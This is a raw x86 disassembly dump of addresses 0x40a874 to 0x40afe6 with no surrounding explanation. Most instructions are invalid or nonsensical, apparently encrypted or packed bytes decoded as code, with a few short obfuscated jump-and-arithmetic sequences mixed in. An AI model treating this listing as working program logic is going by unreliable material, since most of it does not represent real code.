  40a874:	dec    eax
  40a875:	int    0xf3
  40a877:	mov    ds:0xea631924,al
  40a87c:	pop    edx
  40a87d:	ss popa 
  40a87f:	mov    ch,0x42
  40a881:	cdq    
  40a882:	cld    
  40a883:	or     ah,BYTE PTR [esi+0x62e96dd6]
  40a889:	sub    eax,0x3bd13b2e
  40a88e:	xchg   BYTE PTR [ecx],cl
  40a890:	sub    ebx,ebp
  40a892:	test   BYTE PTR [esi+ebp*2+0x3882fe14],ch
  40a899:	(bad)  
  40a89a:	or     al,0xa9
  40a89c:	jno    0x40a883
  40a89e:	mov    ss,WORD PTR [ebx]
  40a8a0:	sbb    al,0x24
  40a8a2:	mov    ah,BYTE PTR [eax+0x13]
  40a8a5:	sub    DWORD PTR [eax-0x42],0xffffff9e
  40a8a9:	jp     0x40a900
  40a8ab:	and    eax,0x13a03ed1
  40a8b0:	jnp    0x40a845
  40a8b2:	cld    
  40a8b3:	ss int3 
  40a8b5:	ds test dl,ch
  40a8b8:	or     dl,BYTE PTR [edi+0x909c03]
  40a8be:	or     al,0x1
  40a8c0:	push   edx
  40a8c1:	jge    0x40a84f
  40a8c3:	xchg   ebp,eax
  40a8c4:	out    dx,eax
  40a8c5:	mov    dh,0xda
  40a8c7:	mov    cl,ch
  40a8c9:	cmc    
  40a8ca:	repnz mov ah,0xed
  40a8cd:	in     eax,0x7
  40a8cf:	out    0xb4,eax
  40a8d1:	add    eax,0x3d8acc1b
  40a8d6:	ret    0x88d7
  40a8d9:	push   es
  40a8da:	(bad)  
  40a8db:	sub    eax,0x31686bc5
  40a8e0:	cwde   
  40a8e1:	jbe    0x40a915
  40a8e3:	call   0x471ec7a4
  40a8e8:	sahf   
  40a8e9:	jb     0x40a8f9
  40a8eb:	push   edx
  40a8ec:	cmp    cl,BYTE PTR ds:0xe603edb0
  40a8f2:	scas   eax,DWORD PTR es:[edi]
  40a8f3:	cmp    dh,BYTE PTR [edx+edx*4]
  40a8f6:	mov    edi,0x4f05e50a
  40a8fb:	inc    esp
  40a8fc:	lods   al,BYTE PTR ds:[esi]
  40a8fd:	push   edx
  40a8fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ff:	and    BYTE PTR ds:0xd1e940f8,0xa1
  40a906:	cmp    edi,DWORD PTR cs:[ebx]
  40a909:	into   
  40a90a:	out    0x85,eax
  40a90c:	and    DWORD PTR [ebp+0x21],ebp
  40a90f:	out    0xbf,eax
  40a911:	xor    ecx,ebx
  40a913:	stos   DWORD PTR es:[edi],eax
  40a914:	loope  0x40a90f
  40a916:	add    edi,DWORD PTR [ecx-0x7b30b00d]
  40a91c:	inc    esp
  40a91d:	(bad)  
  40a91e:	addr16 out 0xa0,al
  40a921:	mov    ebx,0x458b3889
  40a926:	in     al,dx
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    ecx,ecx
  40a948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a949:	icebp  
  40a94a:	retf   0x83da
  40a94d:	js     0x40a9c7
  40a94f:	je     0x40a9cf
  40a951:	js     0x40a9cb
  40a953:	leave  
  40a954:	ins    DWORD PTR es:[edi],dx
  40a955:	addr16 (bad) 
  40a957:	xor    al,0x15
  40a959:	pop    esp
  40a95a:	std    
  40a95b:	je     0x40a935
  40a95d:	stos   BYTE PTR es:[edi],al
  40a95e:	out    0x64,eax
  40a960:	xor    dl,BYTE PTR [ebx-0x44]
  40a963:	push   ebx
  40a964:	and    bl,BYTE PTR [ebp+0x587490fd]
  40a96a:	push   es
  40a96b:	jl     0x40a975
  40a96d:	add    DWORD PTR [ebx],esp
  40a96f:	xchg   ebp,eax
  40a970:	cdq    
  40a971:	fnsave ds:0xa991c90d
  40a977:	fidiv  WORD PTR [ecx]
  40a979:	xchg   edx,eax
  40a97a:	pushf  
  40a97b:	jb     0x40a9e9
  40a97d:	outs   dx,DWORD PTR ds:[esi]
  40a97e:	loope  0x40a997
  40a980:	shl    DWORD PTR [ebx-0xd],cl
  40a983:	mov    BYTE PTR [eax],dl
  40a985:	in     eax,0xa5
  40a987:	cmp    BYTE PTR [ebx-0x47e4db3f],bl
  40a98d:	add    eax,DWORD PTR cs:[edx+ecx*4+0x8d2191f]
  40a995:	pusha  
  40a996:	and    BYTE PTR [edx],bh
  40a998:	or     dl,BYTE PTR [ebx+esi*4+0x72]
  40a99c:	pop    ebx
  40a99d:	and    al,0xee
  40a99f:	ins    BYTE PTR es:[edi],dx
  40a9a0:	pop    edx
  40a9a1:	push   esp
  40a9a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a3:	out    0x61,al
  40a9a5:	inc    esi
  40a9a6:	cs ds sbb ebp,edx
  40a9aa:	inc    esi
  40a9ab:	pop    edi
  40a9ac:	lahf   
  40a9ad:	mov    ds:0x41feb94d,eax
  40a9b2:	pop    ss
  40a9b3:	cld    
  40a9b4:	pop    ebx
  40a9b5:	sub    ecx,DWORD PTR ds:0x5e2a9aa0
  40a9bb:	fsub   st,st(5)
  40a9bd:	std    
  40a9be:	aad    0x34
  40a9c0:	sbb    BYTE PTR [ecx-0x1d],bl
  40a9c3:	std    
  40a9c4:	arpl   WORD PTR [edi-0x71],si
  40a9c7:	mov    esi,0x69899eb2
  40a9cc:	lea    ebp,[esi+0x7fadc399]
  40a9d2:	adc    BYTE PTR [edx],0x45
  40a9d5:	push   es
  40a9d6:	je     0x40a9c5
  40a9d8:	arpl   WORD PTR [esi],ax
  40a9da:	mul    BYTE PTR [esi]
  40a9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9dd:	ds inc esi
  40a9df:	pop    ecx
  40a9e0:	test   ecx,ebx
  40a9e2:	fcmovb st,st(1)
  40a9e4:	pop    esi
  40a9e5:	jle    0x40aa2a
  40a9e7:	mov    ss,WORD PTR [edx+ecx*1+0x0]
  40a9eb:	mov    eax,ds:0x7072553c
  40a9f0:	mov    cl,0xcc
  40a9f2:	sbb    DWORD PTR [ebp-0x73d9af03],0x581936cd
  40a9fc:	outs   dx,DWORD PTR ds:[esi]
  40a9fd:	cmp    dh,BYTE PTR [ebx-0x66]
  40aa00:	mov    WORD PTR [ebp+0x61],ds
  40aa03:	push   0xc1ddc435
  40aa08:	jecxz  0x40aa77
  40aa0a:	pushf  
  40aa0b:	or     eax,0xea149075
  40aa10:	ret    0x808e
  40aa13:	adc    al,ah
  40aa15:	(bad)  
  40aa16:	outs   dx,BYTE PTR ds:[esi]
  40aa17:	push   ds
  40aa18:	call   0x4300:0xdbfe3a15
  40aa1f:	inc    ebx
  40aa20:	mov    dl,dl
  40aa22:	push   0xffffffd1
  40aa24:	in     al,0xee
  40aa26:	xchg   esp,eax
  40aa27:	(bad)  
  40aa28:	xchg   dx,ax
  40aa2a:	lods   eax,DWORD PTR ds:[esi]
  40aa2b:	arpl   WORD PTR [ecx],ax
  40aa2d:	(bad)  
  40aa2e:	xor    ch,BYTE PTR [ebx]
  40aa30:	mov    ah,0x23
  40aa32:	xchg   edi,eax
  40aa33:	ret    
  40aa34:	js     0x40aa5a
  40aa36:	mov    bl,0x78
  40aa38:	data16 jg 0x40aa8e
  40aa3b:	call   0x6fe9:0xa541a01
  40aa42:	test   eax,0x51c7f84d
  40aa47:	mov    ds:0x68e6a1c0,eax
  40aa4c:	adc    DWORD PTR [eax],0xb7c2a6e5
  40aa52:	or     al,BYTE PTR [edx]
  40aa54:	addr16 pop edi
  40aa56:	fadd   QWORD PTR [edx+0x1d]
  40aa59:	dec    esi
  40aa5a:	xchg   esp,eax
  40aa5b:	clc    
  40aa5c:	pop    ss
  40aa5d:	dec    edx
  40aa5e:	push   edi
  40aa5f:	ins    BYTE PTR es:[edi],dx
  40aa60:	fs loopne 0x40aa16
  40aa63:	lahf   
  40aa64:	not    DWORD PTR [esi-0x10]
  40aa67:	lock (bad) 
  40aa69:	fs es or ebx,edx
  40aa6d:	xchg   bl,cl
  40aa6f:	fwait
  40aa70:	mov    cl,BYTE PTR [eax+0x5b46510a]
  40aa76:	cmp    bh,BYTE PTR [ecx-0x5c]
  40aa79:	push   ds
  40aa7a:	stos   DWORD PTR es:[edi],eax
  40aa7b:	daa    
  40aa7c:	sbb    DWORD PTR [esi+0x3dabc638],esp
  40aa82:	push   ebp
  40aa83:	daa    
  40aa84:	sbb    BYTE PTR [ecx],dh
  40aa86:	push   es
  40aa87:	aad    0xb7
  40aa89:	push   cs
  40aa8a:	pop    ebx
  40aa8b:	test   al,dl
  40aa8d:	dec    esp
  40aa8e:	retf   0xe859
  40aa91:	out    0x1c,eax
  40aa93:	cmp    BYTE PTR [eax-0x1],ah
  40aa96:	or     BYTE PTR [edx],ch
  40aa98:	pop    edx
  40aa99:	inc    ecx
  40aa9a:	add    cl,BYTE PTR [esi+0x19]
  40aa9d:	xchg   BYTE PTR [ebx],bl
  40aa9f:	dec    eax
  40aaa0:	mov    esp,esp
  40aaa2:	xor    eax,0x86a112de
  40aaa7:	mov    ch,0x4f
  40aaa9:	pop    ecx
  40aaaa:	sub    dl,dl
  40aaac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaad:	adc    al,BYTE PTR [ebx-0x77301683]
  40aab3:	rcl    DWORD PTR [eax],cl
  40aab5:	mov    edx,0x7c283c0b
  40aaba:	sub    al,0xc0
  40aabc:	and    BYTE PTR [edx-0x6a],ah
  40aabf:	mov    ds:0x3506176c,eax
  40aac4:	and    BYTE PTR [eax+ecx*4+0x7887d753],bh
  40aacb:	jle    0x40aabb
  40aacd:	dec    edx
  40aace:	repz sbb al,0xcb
  40aad1:	push   0x60
  40aad3:	or     esi,edx
  40aad5:	je     0x40aaa4
  40aad7:	dec    edi
  40aad8:	xchg   esi,eax
  40aad9:	jp     0x40aa5d
  40aadb:	xor    eax,0xa65c2ec1
  40aae0:	popf   
  40aae1:	sbb    ecx,esp
  40aae3:	lea    edx,[edx]
  40aae5:	stos   DWORD PTR es:[edi],eax
  40aae6:	or     DWORD PTR [ebx+0x672374ac],edi
  40aaec:	dec    esp
  40aaed:	loopne 0x40ab25
  40aaef:	inc    edx
  40aaf0:	mov    ds:0xf81eb20c,eax
  40aaf5:	cmp    eax,0xc481cc05
  40aafa:	pop    ds
  40aafb:	retf   0xd0e5
  40aafe:	js     0x40aaa0
  40ab00:	mov    al,0x61
  40ab02:	pinsrw mm5,ecx,0xda
  40ab06:	pop    ebx
  40ab07:	pop    esp
  40ab08:	pop    ebx
  40ab09:	imul   ebp,ebx,0xffffffd7
  40ab0c:	jmp    0xc01f35fc
  40ab11:	cli    
  40ab12:	inc    eax
  40ab13:	push   edx
  40ab14:	inc    esi
  40ab15:	push   cs
  40ab16:	and    eax,0xa2103f2e
  40ab1b:	daa    
  40ab1c:	xor    al,0x17
  40ab1e:	inc    edi
  40ab1f:	out    dx,eax
  40ab20:	pop    ds
  40ab21:	rcr    DWORD PTR [eax+ebp*2],1
  40ab24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab25:	popa   
  40ab26:	inc    ebx
  40ab27:	lods   eax,DWORD PTR ds:[esi]
  40ab28:	arpl   WORD PTR ds:0x2dd3c0d3,bx
  40ab2e:	add    eax,0x1c1c7d9c
  40ab33:	popf   
  40ab34:	sbb    eax,0x74f0ea34
  40ab39:	dec    BYTE PTR [eax-0xe34bea2]
  40ab3f:	mov    WORD PTR [esi+0x4d],es
  40ab42:	dec    eax
  40ab43:	mov    ebx,0xbad929ea
  40ab48:	sbb    dl,al
  40ab4a:	xor    al,BYTE PTR [edx+edx*8-0x7675fe1f]
  40ab51:	cmc    
  40ab52:	addr16 pop esp
  40ab54:	lods   al,BYTE PTR ds:[esi]
  40ab55:	xchg   ebx,eax
  40ab56:	xchg   esp,eax
  40ab57:	repnz push esp
  40ab59:	jmp    0xd79deadb
  40ab5e:	pop    ebp
  40ab5f:	mov    edi,0x8df1b69e
  40ab64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab65:	xchg   edi,eax
  40ab66:	repz xchg esi,eax
  40ab68:	mov    al,0x6a
  40ab6a:	add    DWORD PTR [ebx+0x65],esp
  40ab6d:	jbe    0x40ab59
  40ab6f:	add    ch,cl
  40ab71:	sbb    eax,0x65e99e8c
  40ab76:	ret    0x8e79
  40ab79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab7a:	loope  0x40ab05
  40ab7c:	xor    DWORD PTR [ebp+0x4f8b9c3a],edi
  40ab82:	mov    BYTE PTR [ebx],bh
  40ab84:	addr16 leave 
  40ab86:	push   eax
  40ab87:	fistp  DWORD PTR [edi-0x709ad265]
  40ab8d:	lods   al,BYTE PTR ds:[esi]
  40ab8e:	ins    DWORD PTR es:[edi],dx
  40ab8f:	lods   al,BYTE PTR ds:[esi]
  40ab90:	mov    DWORD PTR ds:0xb869660c,ebx
  40ab96:	inc    esi
  40ab97:	push   0xf1cd58a4
  40ab9c:	sub    dh,BYTE PTR [ecx-0x9]
  40ab9f:	pop    ecx
  40aba0:	ja     0x40ab6a
  40aba2:	iret   
  40aba3:	or     eax,0x861cfc03
  40aba8:	or     al,0x76
  40abaa:	xor    eax,0x313fcd97
  40abaf:	call   DWORD PTR [ecx-0x49]
  40abb2:	ret    0xfe02
  40abb5:	outs   dx,DWORD PTR ds:[esi]
  40abb6:	dec    ecx
  40abb7:	ja     0x40abd6
  40abb9:	cmp    al,0x92
  40abbc:	mov    eax,0x37b248a5
  40abc1:	xor    al,BYTE PTR [ecx+0x49]
  40abc4:	add    bh,BYTE PTR [ebx+esi*8-0x43]
  40abc8:	loope  0x40ac3e
  40abca:	jg     0x40ab87
  40abcc:	stos   BYTE PTR es:[edi],al
  40abcd:	inc    ecx
  40abce:	aaa    
  40abcf:	ins    DWORD PTR es:[edi],dx
  40abd0:	test   al,0xae
  40abd2:	mov    ebx,0x3b90a728
  40abd7:	scas   eax,DWORD PTR es:[edi]
  40abd8:	mov    cl,0x28
  40abda:	push   cs
  40abdb:	(bad)  
  40abdc:	ffree  st(7)
  40abde:	xchg   esp,eax
  40abdf:	mov    esp,0x53e743d5
  40abe4:	jbe    0x40ac60
  40abe6:	outs   dx,DWORD PTR ds:[esi]
  40abe7:	xor    esp,DWORD PTR [esi+edx*1+0x58979b71]
  40abee:	push   ss
  40abef:	imul   edx,ebp,0xffffffdb
  40abf2:	loopne 0x40aba6
  40abf4:	sbb    al,0xd
  40abf6:	gs sahf 
  40abf8:	and    dl,ch
  40abfa:	lock pop esp
  40abfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abfd:	lds    esi,FWORD PTR [esi+0xb]
  40ac00:	test   cl,dh
  40ac02:	jmp    0x8e55c853
  40ac07:	ins    BYTE PTR es:[edi],dx
  40ac08:	xchg   edx,eax
  40ac09:	or     al,0xf0
  40ac0b:	xor    eax,0x3382fa14
  40ac10:	jmp    0xa6fa1151
  40ac15:	(bad)  
  40ac16:	sub    esp,DWORD PTR [edx-0x1f0325db]
  40ac1c:	(bad)  
  40ac1d:	stos   BYTE PTR es:[edi],al
  40ac1e:	pop    ecx
  40ac1f:	mov    bl,0x49
  40ac21:	inc    ecx
  40ac22:	pop    edi
  40ac23:	dec    edx
  40ac24:	(bad)  
  40ac25:	gs (bad) 
  40ac27:	arpl   ax,cx
  40ac29:	inc    ebx
  40ac2a:	or     esp,DWORD PTR [ecx]
  40ac2c:	gs ins DWORD PTR es:[edi],dx
  40ac2e:	call   0xcc2784e4
  40ac33:	mov    edx,0x1e47b622
  40ac38:	stos   BYTE PTR es:[edi],al
  40ac39:	mov    ds:0x45b5de32,eax
  40ac3e:	dec    edi
  40ac3f:	fwait
  40ac40:	ins    BYTE PTR es:[edi],dx
  40ac41:	ficomp WORD PTR [ebx-0x56]
  40ac44:	adc    BYTE PTR [edi+0x63ba5224],bl
  40ac4a:	or     ebp,esi
  40ac4c:	jmp    0xd97415c3
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	sysexit 
  40ac8d:	pop    ds
  40ac8e:	nop
  40ac8f:	push   eax
  40ac90:	(bad)  
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac1c
  40ac99:	cs pushf 
  40ac9b:	and    dl,dl
  40ac9d:	push   0x4971102a
  40aca2:	cmp    al,0x82
  40aca4:	adc    eax,0xd22dad70
  40aca9:	xchg   esi,eax
  40acaa:	dec    edx
  40acab:	inc    esp
  40acac:	or     DWORD PTR ds:0xd5f857be,esp
  40acb2:	cli    
  40acb3:	inc    ebx
  40acb4:	in     al,dx
  40acb5:	fsubr  st,st(0)
  40acb7:	xor    eax,0xa6abd9ec
  40acbc:	fwait
  40acbd:	xor    BYTE PTR [eax+0x58],0xd8
  40acc1:	sub    eax,0x78a2f155
  40acc6:	jmp    0x40ad2f
  40acc8:	sub    BYTE PTR [ecx],bl
  40acca:	(bad)  
  40accb:	fbld   TBYTE PTR ds:0x719a6508
  40acd1:	inc    ebp
  40acd2:	out    dx,eax
  40acd3:	xchg   esp,eax
  40acd4:	arpl   WORD PTR [ecx],cx
  40acd6:	inc    ebp
  40acd7:	cdq    
  40acd8:	sar    BYTE PTR [ecx],1
  40acda:	retf   0xbfee
  40acdd:	or     edi,DWORD PTR [ebp+0x5c]
  40ace0:	or     al,0x1b
  40ace2:	pushf  
  40ace3:	mov    ah,0xfd
  40ace5:	cmp    ebp,esi
  40ace7:	mov    ebp,0xff5ab6c5
  40acec:	enter  0x2e2b,0x69
  40acf0:	push   ecx
  40acf1:	cmovnp esi,DWORD PTR [edi+eiz*1+0x2b]
  40acf6:	jg     0x40ad45
  40acf8:	xchg   ecx,eax
  40acf9:	or     BYTE PTR [ebx+0x8a795eb],cl
  40acff:	ret    0x569c
  40ad02:	(bad)  
  40ad03:	call   0x2c4f:0x750d3f81
  40ad0a:	mov    ds:0x1ac2b98b,eax
  40ad0f:	push   ecx
  40ad10:	sub    al,0xd
  40ad12:	int3   
  40ad13:	mov    eax,0xd054bb0c
  40ad18:	ror    BYTE PTR [esp+esi*1-0x62ffec5c],cl
  40ad1f:	fdivr  QWORD PTR [ebx-0x39b680f6]
  40ad25:	pop    eax
  40ad26:	ss out dx,eax
  40ad28:	dec    ebp
  40ad29:	mov    dh,0xbd
  40ad2b:	mov    ds:0xff442e87,al
  40ad30:	inc    ebx
  40ad31:	push   0xfffffff7
  40ad33:	jb     0x40ad20
  40ad35:	cmc    
  40ad36:	jl     0x40ad2f
  40ad38:	loop   0x40acf0
  40ad3a:	lea    ebp,[ebx-0x7b9b371f]
  40ad40:	add    BYTE PTR [eax+0x61db959f],ch
  40ad46:	xor    esp,DWORD PTR [ecx+edi*2+0x44d670e8]
  40ad4d:	or     BYTE PTR [edx-0x4a],dl
  40ad50:	or     BYTE PTR [edx-0x9],al
  40ad53:	stos   BYTE PTR es:[edi],al
  40ad54:	inc    esi
  40ad55:	div    ah
  40ad57:	jecxz  0x40ad57
  40ad59:	mov    ah,0x1
  40ad5b:	das    
  40ad5c:	aas    
  40ad5d:	jmp    0x40ad3f
  40ad5f:	mov    esp,0x4aeb9be1
  40ad64:	push   ds
  40ad65:	jb     0x40ad3a
  40ad67:	scas   eax,DWORD PTR es:[edi]
  40ad68:	mov    ss,WORD PTR ds:0x1dd8da98
  40ad6e:	jle    0x40ad2e
  40ad70:	adc    al,dh
  40ad72:	aad    0x29
  40ad74:	mul    BYTE PTR [ebx+edx*1-0x39213087]
  40ad7b:	inc    eax
  40ad7c:	dec    ebp
  40ad7d:	in     eax,0xc1
  40ad7f:	rol    BYTE PTR [ecx-0x13503a02],0x93
  40ad86:	mov    edx,0x780085d0
  40ad8b:	mov    dh,0x7f
  40ad8d:	(bad)  
  40ad8e:	and    DWORD PTR [eax+0x6aadb8e5],ebp
  40ad94:	stc    
  40ad95:	div    DWORD PTR [esi]
  40ad97:	or     bh,BYTE PTR [edi+0x18]
  40ad9a:	mov    al,0x48
  40ad9c:	jbe    0x40ad67
  40ad9e:	hlt    
  40ad9f:	aam    0x17
  40ada1:	test   al,0xee
  40ada3:	mov    esp,0xc844190f
  40ada8:	mov    bl,0x82
  40adaa:	cmp    BYTE PTR [edx+0x4c],al
  40adad:	mov    edi,0xf4724aae
  40adb2:	xor    DWORD PTR [ecx-0x38fc0421],esi
  40adb8:	jge    0x40ad59
  40adba:	(bad)  
  40adbb:	rcl    BYTE PTR [ebx],1
  40adbd:	mov    esi,0x75bb5d15
  40adc2:	hlt    
  40adc3:	xor    ch,dl
  40adc5:	fist   WORD PTR [ebx-0x28]
  40adc8:	or     eax,0xc9521922
  40adcd:	xchg   ebx,eax
  40adce:	xor    eax,DWORD PTR [edi+0x5487d173]
  40add4:	pop    edx
  40add5:	leave  
  40add6:	sbb    BYTE PTR [esi-0x708f66c7],dl
  40addc:	jg     0x40ae37
  40adde:	cmp    BYTE PTR [eax],0x44
  40ade1:	bound  edi,QWORD PTR [edx-0x1205872a]
  40ade7:	xor    dh,dl
  40ade9:	mov    DWORD PTR [ecx-0x69],esp
  40adec:	mov    eax,DWORD PTR [ebp+0x2440496e]
  40adf2:	dec    edi
  40adf3:	jbe    0x40ad8c
  40adf5:	fcmove st,st(4)
  40adf7:	cmp    ebx,DWORD PTR [edi-0x6b0d099]
  40adfd:	sbb    bh,BYTE PTR [ecx+0x76b1aec4]
  40ae03:	fst    QWORD PTR [edx+0x29]
  40ae06:	mov    WORD PTR [eax+edi*2],?
  40ae09:	mov    ch,dl
  40ae0b:	popf   
  40ae0c:	mov    BYTE PTR [ecx+ebp*4],bh
  40ae0f:	mov    ebx,0x14d20b38
  40ae14:	popf   
  40ae15:	in     eax,0xd
  40ae17:	pop    esi
  40ae18:	xchg   edx,eax
  40ae19:	or     BYTE PTR ds:0x1d3f1cb2,ch
  40ae1f:	fnstsw WORD PTR [esi+0x46]
  40ae22:	jae    0x40adc9
  40ae24:	jmp    0xa326fe79
  40ae29:	test   DWORD PTR [ebp+edx*1+0x7c9b0c7f],ecx
  40ae30:	mov    ds:0xbfe7430a,al
  40ae35:	daa    
  40ae36:	xchg   BYTE PTR [edi+edi*1],ah
  40ae39:	pusha  
  40ae3a:	shl    BYTE PTR [ebx+0x21],0xd2
  40ae3e:	pop    edx
  40ae3f:	xchg   ecx,eax
  40ae40:	cmp    bh,BYTE PTR [edi-0x7feca94f]
  40ae46:	jae    0x40ae75
  40ae48:	push   edx
  40ae49:	pop    ecx
  40ae4a:	pop    edx
  40ae4b:	mov    esi,0x8ad359ce
  40ae50:	mov    eax,0xa0507485
  40ae55:	int3   
  40ae56:	in     al,0xb9
  40ae58:	xchg   esi,eax
  40ae59:	inc    edi
  40ae5a:	loope  0x40aeb7
  40ae5c:	jmp    0xc275a3a8
  40ae61:	sahf   
  40ae62:	and    cl,BYTE PTR [esi-0x2f95b8b4]
  40ae68:	cs adc al,0x18
  40ae6b:	pop    es
  40ae6c:	or     ebx,DWORD PTR ds:0x355d9620
  40ae72:	(bad)  
  40ae73:	iret   
  40ae74:	mov    al,ds:0xcfab35ce
  40ae79:	xor    eax,0x9d60980b
  40ae7e:	pop    es
  40ae7f:	inc    esi
  40ae80:	sub    al,0x58
  40ae82:	cld    
  40ae83:	fst    QWORD PTR [esi+0x3c7cc942]
  40ae89:	sub    DWORD PTR [esi+0x40],edx
  40ae8c:	mov    BYTE PTR [ecx+0x4d],cl
  40ae8f:	add    eax,DWORD PTR [edi+edx*1+0x8]
  40ae93:	xchg   DWORD PTR [ebx],eax
  40ae95:	ss lahf 
  40ae97:	mov    WORD PTR [ecx+0x77ce5fa8],ds
  40ae9d:	cmp    ecx,0x40
  40aea0:	dec    ebp
  40aea1:	xor    eax,0x7bace0b5
  40aea6:	cmc    
  40aea7:	jae    0x40ae48
  40aea9:	mov    edx,0xa5942e4a
  40aeae:	aas    
  40aeaf:	pushf  
  40aeb0:	mov    ah,0xf2
  40aeb2:	xchg   BYTE PTR [eax+0x13c5434d],ah
  40aeb8:	call   FWORD PTR [eax+ebx*2]
  40aebb:	push   DWORD PTR [esi-0x25]
  40aebe:	adc    cl,dl
  40aec0:	or     al,0x9e
  40aec2:	mov    al,0x78
  40aec4:	ret    
  40aec5:	push   eax
  40aec6:	xor    ebx,DWORD PTR [ecx-0x1194b217]
  40aecc:	jne    0x40ae5a
  40aece:	pop    esi
  40aecf:	add    al,0x62
  40aed1:	xchg   esp,eax
  40aed2:	mov    ah,0x2f
  40aed4:	popf   
  40aed5:	pop    esi
  40aed6:	dec    ebp
  40aed7:	cmp    al,BYTE PTR [edi]
  40aed9:	mov    eax,ds:0xc9a35d1e
  40aede:	jb     0x40af4f
  40aee0:	in     al,dx
  40aee1:	(bad)  
  40aee3:	dec    sp
  40aee5:	outs   dx,DWORD PTR ds:[esi]
  40aee6:	inc    eax
  40aee7:	sbb    DWORD PTR [eax],0x47
  40aeea:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40aeec:	aad    0xab
  40aeee:	inc    esp
  40aeef:	leave  
  40aef0:	sbb    DWORD PTR [ebx-0x61cd05c7],0xffffffa9
  40aef7:	out    0x58,ax
  40aefa:	pop    esp
  40aefb:	and    dh,BYTE PTR [eax-0x2a]
  40aefe:	mov    ds:0xe73c213a,al
  40af03:	retf   
  40af04:	push   edi
  40af05:	call   0xfc612ef2
  40af0a:	test   DWORD PTR [ebx+0x21],edi
  40af0d:	aam    0xb0
  40af0f:	in     al,0x6e
  40af11:	adc    bl,bl
  40af13:	in     eax,0x3d
  40af15:	in     al,dx
  40af16:	xor    DWORD PTR [esi-0x3992169d],esi
  40af1c:	retf   0xdba5
  40af1f:	push   esp
  40af20:	dec    ebp
  40af21:	xchg   DWORD PTR [ecx],esi
  40af23:	adc    DWORD PTR [ebx],0x5f
  40af26:	hlt    
  40af27:	pop    ebx
  40af28:	lahf   
  40af29:	icebp  
  40af2a:	pop    es
  40af2b:	mov    ds:0x42f8396e,eax
  40af30:	stc    
  40af31:	lods   eax,DWORD PTR ds:[esi]
  40af32:	or     al,0x26
  40af34:	sbb    bh,BYTE PTR [ecx+0x37]
  40af37:	mov    esi,0x4d19e6ec
  40af3c:	clc    
  40af3d:	inc    eax
  40af3e:	mov    ds:0x6c38a11e,al
  40af43:	fimul  WORD PTR [ebx+0x1f]
  40af46:	aaa    
  40af47:	jmp    0x6b74f378
  40af4c:	clc    
  40af4d:	out    0x1b,al
  40af4f:	ss mov al,0x7
  40af52:	clc    
  40af53:	adc    DWORD PTR [ecx+0x68],ecx
  40af56:	pop    esi
  40af57:	imul   ecx,ebp,0x2b0fdc1f
  40af5d:	adc    eax,0x7d2b0703
  40af62:	mov    edi,DWORD PTR [ebx+0x3b]
  40af65:	mov    ebp,?
  40af67:	(bad)  
  40af68:	fcmovb st,st(7)
  40af6a:	inc    esi
  40af6b:	(bad)  
  40af6c:	sub    al,BYTE PTR [eax+ebx*2]
  40af6f:	sub    eax,0xe0940b59
  40af74:	popf   
  40af75:	call   0x5cd48962
  40af7a:	mov    esi,0x4e4fafcf
  40af7f:	xchg   BYTE PTR [edi-0x7471468f],bl
  40af85:	mov    ?,WORD PTR [edx+0x37]
  40af88:	popa   
  40af89:	aam    0xd1
  40af8b:	outs   dx,BYTE PTR ds:[si]
  40af8d:	int3   
  40af8e:	mov    eax,ds:0x11dd724b
  40af93:	aaa    
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	dec    ecx
  40afb3:	add    ah,bh
  40afb5:	rcl    edx,1
  40afb7:	test   DWORD PTR [eax+0x78],edi
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	mov    esp,0x20b2f013
  40afc3:	test   BYTE PTR [edx+0x3320b007],bl
  40afc9:	jae    0x40b001
  40afcb:	imul   ebp,DWORD PTR [esi+ecx*2],0x620e6ee7
  40afd2:	fstp   DWORD PTR [ebx-0x24]
  40afd5:	aad    0x66
  40afd7:	out    0xa5,al
  40afd9:	mov    esp,0x4e376d93
  40afde:	daa    
  40afdf:	pop    ds
  40afe0:	add    DWORD PTR [ebx+0x4b9acf53],edi
  40afe6:	stc    
